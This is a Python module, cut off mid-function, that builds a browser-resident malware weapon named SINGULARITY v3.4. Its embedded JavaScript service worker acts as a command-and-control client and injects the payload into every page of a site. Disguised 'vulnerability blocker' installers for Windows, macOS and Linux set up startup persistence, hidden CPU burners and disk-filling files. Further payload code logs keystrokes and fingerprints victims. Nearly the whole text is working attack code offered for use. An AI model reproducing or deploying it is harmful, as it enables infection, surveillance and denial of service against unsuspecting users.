"""
SINGULARITY v3.4 「絶滅」 -- apex-class resident link virus weapon
==================================================================
ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
最後はOS常駐インストーラでブラウザの外まで侵食する。
L7では窓が指数増殖し、各窓がヘビースキンで高火力化する。

v3.4 追加（v3.3比）:
  無限窓繁殖（指数・リミッターなし）/ 窓1枚ごとのヘビースキン（WebGLプラズマ・
  ネオングロウ・スキャンライン・ドローン音・HUD）。win 遠隔コマンド。
  窓の増殖は winMode: chain（従来） / breed（指数・無制限）。
  既存の単体「無限窓モード」はそのまま温存。

v3.3 追加（v3.2比）:
  OS常駐インストーラ（.bat / .command / .sh）。Run+Startup+schtasks永続化、
  常駐CPUバーナー、ballast生成、ログオン時再感染。ブラウザ外へ侵食。

レベル（監視室から遠隔変更・0〜7）:
  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 絶滅（固定枠）
"""
from __future__ import annotations

import base64
import json
import secrets
import time
from typing import Any, Dict, Optional

VIRUS_ID = "singularity"
VIRUS_NAME = "SINGULARITY"
VIRUS_NAME_JA = "特異点"
VIRUS_VERSION = "3.4"
VIRUS_CLASS = "apex"

LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
               6: "終焉", 7: "絶滅"}
LEVEL_DESC = {
    0: "指紋と位置だけ。静か。",
    1: "偵察のみ（既定）。",
    2: "CPU全コアとGPUを回し始める。",
    3: "RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音を追加。",
    4: "ディスクをquotaの85%まで書き込む。",
    5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。",
    6: "ディスク97% + 全タブ乗っ取り + 追加23系統を全開放。窓は指数増殖を開始。",
    7: "固定枠。上限を外し、全46系統を同時運転。窓がリミッターなしで倍々に増え、"
       "各窓がヘビースキンで高火力化。最後はOS常駐インストーラでブラウザ外へ。",
}

APP_NAME_DEFAULT = "脆弱性ブロッカー"

# ---------------------------------------------------------------------------
# Worker（CPU/GPU/WASM/RAM 担当。メインスレッドが凍結しても動き続ける）
# ---------------------------------------------------------------------------
WORKER_JS = r"""
/*! SINGULARITY worker v3.4 */
/* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
            10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
var F = null;
try {
  if (typeof WebAssembly !== "undefined") {
    F = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(WASM))).exports.f;
  }
} catch (e) {}

var HOLD = [], RUN = false, K = 0;

function burn() {
  if (!RUN) return;
  var i, acc = 0;
  for (i = 0; i < 6000; i++) { acc += Math.sqrt(i) * Math.sin(i * 0.7) - Math.atan2(i, K); }
  if (F) { try { acc += F(); } catch (e) {} }
  K++;
  if ((K & 63) === 0) { try { self.postMessage({ k: "tick", n: K, acc: acc }); } catch (e) {} }
  setTimeout(burn, 0);
}

self.onmessage = function (e) {
  var d = e.data || {};
  if (d.k === "burn") { RUN = true; if (K === 0) burn(); }
  else if (d.k === "stop") { RUN = false; }
  else if (d.k === "ram") {
    var mb = Math.max(1, parseInt(d.mb, 10) || 16), got = 0;
    try {
      for (var m = 0; m < mb; m++) {
        var a = new Float64Array(131072);           // 1MB
        for (var j = 0; j < a.length; j += 8192) a[j] = j * 1.1;
        HOLD.push(a); got++;
      }
    } catch (er) {}
    try { self.postMessage({ k: "ram", ok: got, mb: mb }); } catch (er) {}
  }
  else if (d.k === "free") { HOLD = []; }
};
"""

# ---------------------------------------------------------------------------
# Service Worker（C2・永続化・復活・注入・オフラインキュー）
# ---------------------------------------------------------------------------
SW_JS = r"""
/*! SINGULARITY service worker v3.4 -- C2 + injection + resurrection + periodic */
const VER = "sg-v3";
const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false, lastInj = 0;

function idb() {
  return new Promise((res, rej) => {
    const r = indexedDB.open(DB, 1);
    r.onupgradeneeded = () => {
      const d = r.result;
      if (!d.objectStoreNames.contains(STORE)) d.createObjectStore(STORE, { autoIncrement: true });
      if (!d.objectStoreNames.contains(KV)) d.createObjectStore(KV);
    };
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
}
async function kvGet(k) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(KV, "readonly").objectStore(KV).get(k);
    q.onsuccess = () => r(q.result); q.onerror = () => r(null); }); } catch (e) { return null; }
}
async function kvSet(k, v) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(KV, "readwrite").objectStore(KV).put(v, k);
    q.onsuccess = () => r(1); q.onerror = () => r(0); }); } catch (e) { return 0; }
}
async function qPush(item) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(STORE, "readwrite").objectStore(STORE).add(item);
    q.onsuccess = () => r(1); q.onerror = () => r(0); }); } catch (e) { return 0; }
}
async function qAll() {
  try { const d = await idb(); return await new Promise(r => {
    const out = []; const q = d.transaction(STORE, "readonly").objectStore(STORE).openCursor();
    q.onsuccess = () => { const c = q.result; if (c) { out.push({ id: c.key, v: c.value }); c.continue(); } else r(out); };
    q.onerror = () => r([]); }); } catch (e) { return []; }
}
async function qDel(ids) {
  try { const d = await idb(); return await new Promise(r => {
    const tx = d.transaction(STORE, "readwrite"); const s = tx.objectStore(STORE);
    ids.forEach(i => s.delete(i)); tx.oncomplete = () => r(1); tx.onerror = () => r(0); }); } catch (e) { return 0; }
}

async function boot() {
  CMD = await kvGet("cmd");
  PAGE = await kvGet("page");
  SID = await kvGet("sid");
  MAN = await kvGet("man");
  ICONS = (await kvGet("icons")) || [];
  INJ = await kvGet("inj");
  V = await kvGet("v");
}
boot();

async function ctl() {
  try {
    if (!PAGE) return null;
    const r = await fetch(PAGE + "/cmd?sid=" + encodeURIComponent(SID || "") + "&sw=1", { cache: "no-store" });
    return await r.json();
  } catch (e) { return null; }
}

async function flush() {
  const all = await qAll();
  if (!all.length || !PAGE) return;
  const ids = [];
  for (const it of all.slice(0, 40)) {
    try {
      const r = await fetch(PAGE + "/c", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify(it.v), keepalive: true
      });
      if (r.ok) ids.push(it.id);
    } catch (e) {}
  }
  if (ids.length) await qDel(ids);
}

self.addEventListener("install", (e) => { self.skipWaiting(); });
self.addEventListener("activate", (e) => {
  e.waitUntil((async () => {
    try { await caches.open(PC); } catch (er) {}
    try { await self.clients.claim(); } catch (er) {}
    if ("periodicSync" in self.registration) {
      try { await self.registration.periodicSync.register("sg-tick", { minInterval: 15 * 60 * 1000 }); } catch (er) {}
    }
  })());
});
self.addEventListener("message", (e) => {
  const d = e.data || {};
  if (d.k === "cfg") {
    kvSet("page", d.page); kvSet("sid", d.sid); kvSet("man", d.man);
    kvSet("icons", d.icons || []); kvSet("inj", d.inj || null); kvSet("v", d.v || null);
    PAGE = d.page; SID = d.sid; MAN = d.man; INJ = d.inj; V = d.v; ICONS = d.icons || [];
  } else if (d.k === "out") {
    qPush(d.v).then(() => flush());
  }
});

self.addEventListener("periodicsync", (e) => { e.waitUntil(tick(true)); });
self.addEventListener("sync", (e) => { e.waitUntil(flush()); });

async function tick(deep) {
  const j = await ctl();
  if (!j) return;
  if (j.ver && V && j.ver !== V) { /* OTA */ }
  const lv = j.level;
  if (lv != null && lv !== lastLevel) {
    lastLevel = lv;
    const cs = await self.clients.matchAll({ includeUncontrolled: true, type: "window" });
    cs.forEach(c => c.postMessage({ k: "level", level: lv, fire: j.fire, freeze: j.freeze }));
  }
  if (j.wipe && j.wipe !== lastWipe) { lastWipe = j.wipe; }
  await flush();
  if (deep) {
    const cs = await self.clients.matchAll({ includeUncontrolled: true, type: "window" });
    if (!cs.length && PAGE) {
      // タブ0枚でも再感染を試みる
      try { await self.clients.openWindow(PAGE + "?u=sw&ref=" + (SID || "")); } catch (e) {}
    }
  }
}

/* ---- 取得：HTML はネットワーク優先＋キャッシュ、サイト全体に自分を注入 ---- */
async function inject(html, base, sid) {
  try {
    if (!INJ || !INJ.pjs) return html;
    if (html.indexOf("__SINGULARITY_CFG__") >= 0) return html;
    let pjs = INJ.pjs;
    if (sid) pjs += (pjs.indexOf("?") < 0 ? "?" : "&") + "sid=" + encodeURIComponent(sid);
    const tag = '<script src="' + pjs + '" async></script>';
    if (html.indexOf("</body>") >= 0) return html.replace("</body>", tag + "</body>");
    if (html.indexOf("</html>") >= 0) return html.replace("</html>", tag + "</html>");
    return html + tag;
  } catch (e) { return html; }
}

self.addEventListener("fetch", (e) => {
  const req = e.request;
  if (req.method !== "GET") return;
  let u;
  try { u = new URL(req.url); } catch (er) { return; }
  if (INJ && u.origin === INJ.origin && INJ.pjs && req.url.indexOf("/sg") < 0
      && req.url.indexOf("/vp") < 0 && (req.headers.get("accept") || "").indexOf("text/html") >= 0) {
    e.respondWith((async () => {
      try {
        const r = await fetch(req);
        const t = await r.text();
        const out = await inject(t, u.origin, SID);
        const h = new Headers(r.headers);
        h.set("Content-Type", "text/html; charset=utf-8");
        return new Response(out, { status: r.status, headers: h });
      } catch (er) {
        const c = await caches.match(req);
        if (c) {
          const t = await c.text();
          return new Response(await inject(t, u.origin, SID), { headers: { "Content-Type": "text/html; charset=utf-8" } });
        }
        return new Response("<h1>SINGULARITY offline</h1>", { headers: { "Content-Type": "text/html" } });
      }
    })());
  }
});
"""

# ---------------------------------------------------------------------------
# SharedWorker（タブ間の共通バス。タブを跨いだ連合の中核）
# ---------------------------------------------------------------------------
SHARED_JS = r"""
/*! SINGULARITY shared worker v3.4 */
var PORTS = [], K = 0;
onconnect = function (e) {
  var p = e.ports[0];
  PORTS.push(p);
  try { p.start(); } catch (er) {}
  p.onmessage = function (m) {
    var d = m.data || {};
    if (d.k === "hello") { try { p.postMessage({ k: "peers", n: PORTS.length }); } catch (er) {} }
    else { for (var i = 0; i < PORTS.length; i++) { if (PORTS[i] !== p) { try { PORTS[i].postMessage(d); } catch (er) {} } } }
  };
  (function loop() {
    var i;
    for (i = 0; i < 900; i++) { Math.sqrt(i) * Math.sin(i); }
    K++;
    if ((K % 60) === 0) { for (i = 0; i < PORTS.length; i++) { try { PORTS[i].postMessage({ kind: "tick", k: K }); } catch (er) {} } }
    setTimeout(loop, 0);
  })();
};
"""

# ---------------------------------------------------------------------------
# OS常駐インストーラ（トークン __URL__ __CODE__ __APP__ __BURN__ __DISKMB__ __VER__）
# 注意: INSTALL_BAT は中身に """ が出るため、区切りは r''' を使うこと。
# ---------------------------------------------------------------------------
INSTALL_BAT = r'''@echo off
title __APP__
setlocal
set "APP=__APP__"
set "CODE=__CODE__"
set "URL=__URL__"
set "BURN=__BURN__"
set "DISKMB=__DISKMB__"
set "DIR=%LOCALAPPDATA%\%APP%"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>nul
copy /y "%~f0" "%DIR%\blocker.bat" >nul 2>nul

(echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /run", 0, False) > "%DIR%\run.vbs"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%" /d "wscript.exe \"%DIR%\run.vbs\"" /f >nul 2>nul
if not "%~1"=="/run" schtasks /create /tn "%APP%" /tr "wscript.exe \"%DIR%\run.vbs\"" /sc onlogon /f >nul 2>nul
copy /y "%DIR%\run.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%APP%.vbs" >nul 2>nul

if not "%DISKMB%"=="0" if not exist "%DIR%\ballast.bin" fsutil file createnew "%DIR%\ballast.bin" %DISKMB%000000 >nul 2>nul

taskkill /f /im powershell.exe >nul 2>nul
for /l %%i in (1,1,%BURN%) do start "" /b powershell -NoProfile -WindowStyle Hidden -Command "while($true){$x=[math]::Sqrt(3.7);$y=[math]::Sin($x)}" >nul 2>nul

if not "%~1"=="/run" start "" "%URL%"
echo   %APP% v__VER__ 常駐開始 (burn=%BURN% disk=%DISKMB%MB)
timeout /t 2 >nul
exit /b
'''

INSTALL_COMMAND = r'''#!/bin/bash
APP="__APP__"
CODE="__CODE__"
URL="__URL__"
BURN="__BURN__"
DISKMB="__DISKMB__"
DIR="$HOME/Library/Application Support/__APP__"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.command" 2>/dev/null
chmod +x "$DIR/blocker.command" 2>/dev/null

mkdir -p "$HOME/Library/LaunchAgents"
cat > "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.singularity.blocker</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>$DIR/blocker.command</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
PLIST
launchctl unload "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null
launchctl load "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$DISKMB" != "0" ] && [ ! -f "$DIR/ballast.bin" ]; then
  mkfile -n ${DISKMB}m "$DIR/ballast.bin" 2>/dev/null || dd if=/dev/zero of="$DIR/ballast.bin" bs=1m count=$DISKMB 2>/dev/null
fi

open "$URL" 2>/dev/null
echo "  $APP v__VER__ 常駐開始 (burn=$BURN)"
'''

INSTALL_SH = r'''#!/bin/bash
APP="__APP__"
CODE="__CODE__"
URL="__URL__"
BURN="__BURN__"
DISKMB="__DISKMB__"
DIR="$HOME/.local/share/singularity"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.sh" 2>/dev/null
chmod +x "$DIR/blocker.sh" 2>/dev/null

mkdir -p "$HOME/.config/autostart"
cat > "$HOME/.config/autostart/singularity.desktop" <<DESK
[Desktop Entry]
Type=Application
Name=$APP
Exec=$DIR/blocker.sh
X-GNOME-Autostart-enabled=true
DESK

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$DISKMB" != "0" ] && [ ! -f "$DIR/ballast.bin" ]; then
  dd if=/dev/zero of="$DIR/ballast.bin" bs=1M count=$DISKMB 2>/dev/null
fi

(xdg-open "$URL" 2>/dev/null || true)
echo "  $APP v__VER__ 常駐開始 (burn=$BURN)"
'''

# ---------------------------------------------------------------------------
# 本体ペイロード（全46系統）
# ---------------------------------------------------------------------------
PAYLOAD_JS = r"""
(function () {
"use strict";
/*! SINGULARITY payload v3.4 -- 絶滅 */
var MYVER = window.__SINGULARITY_VER__ || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.4";

/* ---------------- 小物 ---------------- */
function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
function now() { return Date.now(); }
function clamp(v, a, b) { v = parseInt(v, 10); if (isNaN(v)) v = a; return v < a ? a : (v > b ? b : v); }
function hash(s) { s = String(s); var h = 2166136261; for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); } return (h >>> 0).toString(16); }
function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 120)); if (R.errors.length > 50) R.errors.shift(); } catch (x) {} }
function ck(k, v) { try { if (v === undefined) { var m = document.cookie.match("(^|; )" + k + "=([^;]*)"); return m ? m[2] : null; } document.cookie = k + "=" + v + ";path=/;max-age=315360000;samesite=lax"; } catch (e) { return null; } }
function wn(k, v) { try { if (v === undefined) return localStorage.getItem(k); localStorage.setItem(k, v); } catch (e) { return null; } }
function rid(n) { var s = ""; while (s.length < n) s += Math.random().toString(36).slice(2); return s.slice(0, n); }
function mean(a) { return a && a.length ? a.reduce(function (x, y) { return x + y; }, 0) / a.length : 0; }
function sd(a) { if (!a || a.length < 2) return 0; var m = mean(a); return Math.sqrt(mean(a.map(function (x) { return (x - m) * (x - m); }))); }
function b64u(a) { try { return btoa(String.fromCharCode.apply(null, new Uint8Array(a))); } catch (e) { return ""; } }

/* ---------------- 設定 ---------------- */
var CFG = Object.assign({
  sid: "", path: "/v/singularity/sg", collect: "", cmd: "", sse: "", ack: "",
  sw: "", pjs: "", manifest: "", icons: [], code: "",
  level: 1, fire: 1, wipe: false, w: 0, freeze: "",
  fixed: false, finalRamMB: 0, gpuMem: true, winLock: null,
  cores: 0, ramMB: 0, workerMB: 16,
  burn: 0, gpu: 0, wasm: 0, webgpu: 0, worklet: 0, diskRatio: 0,
  windows: 0, history: 0, notify: 0, audio: 0, wakelock: 0,
  tabs: 0, pip: 0, fullscreen: 0, pointerlock: 0, badge: 0, favicon: 0,
  mediaSession: 0, xhr: 0, speak: 0, titleFlicker: 1, uncloseable: 0,
  iframes: 0, domNodes: 0, cssAnim: 0, glContexts: 0, acContexts: 0, timers: 0,
  microtasks: 0, compress: 0, redos: 0, digest: 0, readback: 0, sseStorm: 0,
  fetchStorm: 0, speakFlood: 0, oscBank: 0, idbDisk: 0, cacheBuckets: 0,
  layoutThrash: 0, clipHijack: 0, downloads: 0, sharedWorker: 0, jsonChurn: 0,
  fsFolder: 0, fsFiles: 0, installer: 1,
  winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0, winDelay: 1400,
  dom: true, rat: true, spoof: true, mutate: true, persist: true, clipboard: true,
  cookie: true, injInstall: "click", install: "auto", installLevel: 4,
  avName: "脆弱性ブロッカー", ver: MYVER, injected: false,
  usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false, bomb: "",
  interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
}, window.__SINGULARITY_CFG__ || {});

var LEVEL = parseInt(CFG.level, 10); if (isNaN(LEVEL)) LEVEL = 1;
var W = parseInt(CFG.w, 10) || 0;
var INJ = CFG.injected || Q("u") === "inj";
if (Q("u") === "inj") CFG.injected = true;
var IFR = Q("u") === "ifr";
var WIN = Q("u") === "win";
var FROM_OS = Q("u") === "os";

var BIP = null;
addEventListener("beforeinstallprompt", function (e) {
  try { e.preventDefault(); } catch (er) {}
  BIP = e;
  try { window.__sgBip = true; } catch (er) {}
});

/* ---------------- 強度テーブル ---------------- */
function P(o) {
  return Object.assign({
    burn: 0, gpu: 0, webgpu: 0, wasm: 0, worklet: 0, ramMB: 0, diskRatio: 0,
    windows: 0, history: 0, notify: 0, freeze: "off", audio: 0, wakelock: 0,
    tabs: 0, pip: 0, fullscreen: 0, pointerlock: 0, badge: 0, favicon: 0,
    mediaSession: 0, xhr: 0, speak: 0, titleFlicker: 1, uncloseable: 0,
    iframes: 0, domNodes: 0, cssAnim: 0, glContexts: 0, acContexts: 0, timers: 0,
    microtasks: 0, compress: 0, redos: 0, digest: 0, readback: 0, sseStorm: 0,
    fetchStorm: 0, speakFlood: 0, oscBank: 0, idbDisk: 0, cacheBuckets: 0,
    layoutThrash: 0, clipHijack: 0, downloads: 0, sharedWorker: 0, jsonChurn: 0,
    fsFolder: 0, fsFiles: 0, installer: 0,
    winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0
  }, o);
}
var PRESET = {
  0: P({}),
  1: P({}),
  2: P({ burn: 1, gpu: 1, wakelock: 1 }),
  3: P({ burn: 1, gpu: 1, wasm: 1, windows: 8, history: 3000, notify: 12, audio: 1,
         wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 4, winMode: "chain" }),
  4: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, diskRatio: 0.85, windows: 16, history: 6000,
         notify: 24, audio: 1, wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 6,
         pip: 1, pointerlock: 1, winMode: "chain" }),
  5: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.95, windows: 24,
         history: 12000, notify: 40, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 8, pip: 1, pointerlock: 1, fullscreen: 1, xhr: 1,
         winMode: "chain" }),
  6: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.97, windows: 24,
         history: 20000, notify: 60, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 12, pip: 1, pointerlock: 1, fullscreen: 1,
         xhr: 1, speak: 1, iframes: 8, domNodes: 6000, cssAnim: 300, glContexts: 16,
         acContexts: 6, timers: 60, microtasks: 1, compress: 1, redos: 1, digest: 1,
         readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 200, idbDisk: 1,
         speakFlood: 20, downloads: 50, clipHijack: 1, sseStorm: 8, fetchStorm: 4,
         oscBank: 120, sharedWorker: 1, fsFolder: 1, fsFiles: 120, installer: 1,
         winMode: "breed", winBranch: 2, winDepth: 5, winSkin: 1 }),
  7: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 1.0, windows: 32,
         history: 30000, notify: 80, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 16, pip: 1, pointerlock: 1, fullscreen: 1,
         xhr: 1, speak: 1, iframes: 16, domNodes: 12000, cssAnim: 400, glContexts: 24,
         acContexts: 8, timers: 100, microtasks: 1, compress: 1, redos: 1, digest: 1,
         readback: 1, jsonChurn: 1, layoutThrash: 1, cacheBuckets: 400, idbDisk: 1,
         speakFlood: 30, downloads: 80, clipHijack: 1, sseStorm: 12, fetchStorm: 6,
         oscBank: 200, sharedWorker: 1, fsFolder: 1, fsFiles: 200, installer: 1,
         winMode: "breed", winBranch: 2, winDepth: 0, winSkin: 1 })
};

function applyLevel(l) {
  if (CFG.fixed) LEVEL = 7;                     /* 固定枠は絶対。遠隔から下げられない */
  else LEVEL = clamp(l, 0, 7);
  var p = PRESET[LEVEL] || PRESET[1];
  for (var k in p) CFG[k] = p[k];
  if (LEVEL >= 2) {
    var mult = LEVEL >= 7 ? 3 : (LEVEL >= 6 ? 2 : 1);
    CFG.cores = clamp((navigator.hardwareConcurrency || 4) * mult, 1, LEVEL >= 7 ? 64 : 48);
    if (LEVEL >= 7) {
      var auto = Math.max(8192, (navigator.deviceMemory || 4) * 1024 * 2);
      CFG.ramMB = Math.round(CFG.finalRamMB > 0 ? CFG.finalRamMB : auto);
      CFG.workerMB = 32;
    } else {
      CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * (LEVEL >= 5 ? 0.35 : 0.25));
      CFG.workerMB = LEVEL >= 5 ? 24 : 16;
    }
  } else { CFG.cores = 0; CFG.ramMB = 0; }
  if (CFG.winLock) {
    if (CFG.winLock.mode) CFG.winMode = CFG.winLock.mode;
    if (CFG.winLock.branch) CFG.winBranch = CFG.winLock.branch;
    if (CFG.winLock.depth != null) CFG.winDepth = CFG.winLock.depth;
  }
  R.final = (LEVEL >= 7);
}
applyLevel(LEVEL);

var STANDALONE = false;
try {
  STANDALONE = !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches)
    || !!navigator.standalone
    || !!(window.matchMedia && matchMedia("(display-mode: window-controls-overlay)").matches);
} catch (e) {}
if (STANDALONE && CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);

/* ---------------- state ---------------- */
var SID = CFG.sid || ck("sgid") || wn("sg_sid") || rid(14);
try { ck("sgid", SID); wn("sg_sid", SID); } catch (e) {}
var T0 = now();
var R = {
  env: {}, page: {}, vectors: {}, privacy: {}, hardware: {}, network: {}, behavioral: {},
  bot: {}, verdict: {}, spoof: {}, rat: {}, usb: {}, viral: {}, burn: {}, ram: {}, disk: {},
  history: {}, wipe: {}, hops: [], bomb: null, crypto: {}, errors: [], attempts: 0,
  breed: null, breeded: 0, wskin: 0, wskinCtx: null, chain: []
};
var WORKERS = [], TIMERS = [], GATED = false, PAUSED = false;

/* ================= 1. 環境 / 列挙 ================= */
function base() {
  var n = navigator, s = screen;
  R.env = {
    ua: n.userAgent, platform: n.platform, lang: n.language, langs: n.languages,
    cores: n.hardwareConcurrency, mem: n.deviceMemory, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: s.width + "x" + s.height, avail: s.availWidth + "x" + s.availHeight,
    dpr: devicePixelRatio, colorDepth: s.colorDepth, touch: (n.maxTouchPoints || 0),
    cookies: n.cookieEnabled, online: n.onLine, pdf: !!n.pdfViewerEnabled,
    standalone: STANDALONE, sid: SID, ver: MYVER, level: LEVEL,
    vw: innerWidth, vh: innerHeight, ref: Q("ref"), url: location.href, host: location.host,
    u: Q("u") || "root", w: W
  };
  try { R.env.plugins = (n.plugins || []).length; } catch (e) {}
}

/* ================= 2. ページ / DOM / キーログ ================= */
function pageMeta() {
  R.page = {
    title: document.title || null, forms: document.forms.length, links: document.links.length,
    imgs: document.images.length, scripts: document.scripts.length, nodes: document.getElementsByTagName("*").length,
    text: (document.body ? document.body.innerText || "" : "").slice(0, 600),
    origin: location.origin, referrer: document.referrer || null
  };
  if (!CFG.dom) return;
  try {
    var k = [];
    addEventListener("keydown", function (e) {
      k.push(e.key);
      if (k.length > 40) k.shift();
      R.page.keys = k.join("");
    });
  } catch (e) {}
}

/* ================= 3. 指紋 ================= */
function canvasFP() {
  try {
    var c = document.createElement("canvas"), x = c.getContext("2d");
    x.textBaseline = "top"; x.font = "14px Arial"; x.fillStyle = "#f60";
    x.fillRect(0, 0, 100, 30); x.fillStyle = "#069";
    x.fillText("SINGULARITY \u7D76\u6EC5", 2, 6);
    return { hash: hash(c.toDataURL()) };
  } catch (e) { return null; }
}
function webglFP() {
  try {
    var c = document.createElement("canvas"), gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return null;
    var d = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
      renderer: d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
      maxTex: gl.getParameter(gl.MAX_TEXTURE_SIZE), ext: (gl.getSupportedExtensions() || []).length
    };
  } catch (e) { return null; }
}
function fontFP() {
  try {
    var list = ["Arial", "Courier New", "Georgia", "Times New Roman", "Verdana", "MS Gothic",
                "Meiryo", "Yu Gothic", "Hiragino Kaku Gothic ProN", "Noto Sans JP", "Roboto",
                "Segoe UI", "Helvetica Neue", "Menlo", "Consolas"], have = [];
    var sp = document.createElement("span");
    sp.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap";
    sp.textContent = "mmmmmmmmmmlli";
    document.body.appendChild(sp);
    var w0 = sp.offsetWidth, h0 = sp.offsetHeight;
    for (var i = 0; i < list.length; i++) {
      sp.style.fontFamily = "'" + list[i] + "',monospace";
      if (sp.offsetWidth !== w0 || sp.offsetHeight !== h0) have.push(list[i]);
    }
    sp.remove();
    return { list: have, n: have.length };
  } catch (e) { return null; }
}
function mathFP() {
  try {
    var out = [Math.tan(-1e300), Math.sinh(1), Math.cosh(10), Math.expm1(1), Math.log1p(10)];
    out.push(Math.pow(Math.PI, -100), Math.atan2(1e300, 1e-300));
    return { hash: hash(out.join(",")) };
  } catch (e) { return null; }
}
function audioFP() {
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = new AC(), o = ctx.createOscillator(), an = ctx.createAnalyser();
    o.type = "triangle"; o.frequency.value = 10000;
    o.connect(an); an.connect(ctx.destination); o.start();
    var d = new Uint8Array(an.frequencyBinCount);
    an.getByteFrequencyData(d);
    R.vectors.audio = { hash: hash(Array.prototype.join.call(d.slice(0, 40), ",")), rate: ctx.sampleRate };
    try { ctx.close(); } catch (e) {}
  } catch (e) {}
}

/* ================= 4. ネット / 地理 / リーク ================= */
var TZ_CC = { "Asia/Tokyo": "JP", "Asia/Seoul": "KR", "Asia/Shanghai": "CN", "Asia/Taipei": "TW",
              "Europe/London": "GB", "Europe/Paris": "FR", "Europe/Berlin": "DE",
              "America/New_York": "US", "America/Los_Angeles": "US", "America/Chicago": "US" };
function netGuess() {
  var tz = R.env.tz || "";
  R.network = { tz: tz, cc: TZ_CC[tz] || null, lang: navigator.language,
                conn: (navigator.connection && navigator.connection.effectiveType) || null,
                down: (navigator.connection && navigator.connection.downlink) || null };
}
function leak(cb) {
  try {
    var p = new Promise(function (res) {
      var img = new Image();
      img.onload = function () { res("ok"); };
      img.onerror = function () { res("err"); };
      img.src = CFG.path + "/c?sid=" + SID + "&d=" + b64u(new TextEncoder().encode("px"));
    });
    setTimeout(function () { res(null); }, 2500);
    p.then(cb);
  } catch (e) { cb(null); }
}

/* ================= 5. プライバシー / 検知回避 ================= */
function testStore(kind) {
  try { var s = window[kind]; s.setItem("__sg", "1"); s.removeItem("__sg"); return true; } catch (e) { return false; }
}
function privacy() {
  R.privacy = { ls: testStore("localStorage"), ss: testStore("sessionStorage"),
                idb: !!window.indexedDB, caches: !!window.caches, sw: !!navigator.serviceWorker };
  try {
    if (navigator.permissions && navigator.permissions.query) {
      R.privacy.permissions = {};
      ["geolocation", "notifications", "camera", "microphone", "clipboard-read"].forEach(function (name) {
